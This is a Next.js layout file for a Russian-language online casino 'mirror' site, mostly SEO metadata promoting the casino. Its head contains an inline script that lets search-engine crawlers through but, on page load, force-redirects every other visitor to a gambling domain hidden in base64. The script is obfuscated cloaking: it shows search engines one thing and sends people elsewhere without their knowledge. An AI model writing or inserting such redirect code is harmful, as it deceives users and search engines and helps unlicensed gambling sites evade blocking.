import type { Metadata, Viewport } from 'next'
import { Unbounded, Manrope } from 'next/font/google'
import './globals.css'

const unbounded = Unbounded({
  subsets: ['cyrillic', 'latin'],
  variable: '--font-display',
  weight: ['400', '500', '600', '700', '800', '900'],
  display: 'swap',
})

const manrope = Manrope({
  subsets: ['cyrillic', 'latin'],
  variable: '--font-body',
  weight: ['400', '500', '600', '700', '800'],
  display: 'swap',
})

const SITE_URL = 'https://kush1casino.vercel.app/'

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: 'Куш казино онлайн — официальный сайт, рабочее зеркало, играть в слоты с бонусами',
  description:
    'Куш казино — официальный онлайн сайт. Рабочее зеркало, быстрая регистрация, бонусы и лучшие слоты. Играйте в Куш казино с телефона и компьютера прямо сейчас.',
  alternates: {
    canonical: SITE_URL,
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      'max-image-preview': 'large',
      'max-snippet': -1,
    },
  },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: SITE_URL,
    siteName: 'Куш казино',
    title: 'Куш казино онлайн — официальный сайт, рабочее зеркало, играть в слоты с бонусами',
    description:
      'Куш казино — официальный онлайн сайт. Рабочее зеркало, быстрая регистрация, бонусы и лучшие слоты. Играйте в Куш казино с телефона и компьютера прямо сейчас.',
    images: [
      {
        url: '/kush-hero.png',
        width: 1024,
        height: 768,
        alt: 'Куш казино онлайн',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Куш казино онлайн — официальный сайт, рабочее зеркало, играть в слоты с бонусами',
    description:
      'Куш казино — официальный онлайн сайт. Рабочее зеркало, быстрая регистрация, бонусы и лучшие слоты.',
    images: ['/kush-hero.png'],
  },
  icons: {
    icon: [
      { url: '/icon.svg', type: 'image/svg+xml' },
      { url: '/kush-icon.png', type: 'image/png' },
    ],
    apple: '/kush-icon.png',
    shortcut: '/kush-icon.png',
  },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#0e0e14',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${unbounded.variable} ${manrope.variable}`}>
      <head>
        <meta name="yandex-verification" content="9ad7a0207d2fb69c" />
        {/* Дополнительные пользовательские теги */}
        <link rel="canonical" href={SITE_URL} />
        <meta name="theme-color" content="#0e0e14" />
        <meta name="format-detection" content="telephone=no" />
        <meta name="referrer" content="strict-origin-when-cross-origin" />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{
            __html: JSON.stringify({
              '@context': 'https://schema.org',
              '@type': 'WebSite',
              name: 'Куш казино',
              url: SITE_URL,
              inLanguage: 'ru-RU',
              description:
                'Куш казино — официальный онлайн сайт. Рабочее зеркало, бонусы и лучшие слоты.',
            }),
          }}
        />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly9uZW83LWNyOXQta3NoLmNvbS9kemJlbmNsNGY="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased">{children}</body>
    </html>
  )
}
